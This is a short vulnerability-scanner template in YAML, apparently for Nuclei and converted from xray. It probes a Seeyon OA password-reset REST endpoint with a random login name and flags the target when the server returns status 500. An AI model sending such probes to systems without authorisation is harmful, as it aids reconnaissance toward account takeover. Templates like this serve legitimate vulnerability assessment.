id: poc-yaml-seeyon-oa-password-reset

info:
  name: poc-yaml-seeyon-oa-password-reset
  author: Chaitin
  severity: medium
  tags: xray-converted

http:
  - raw:
      - |
        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"loginName":"{{rand_base(8)}}"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500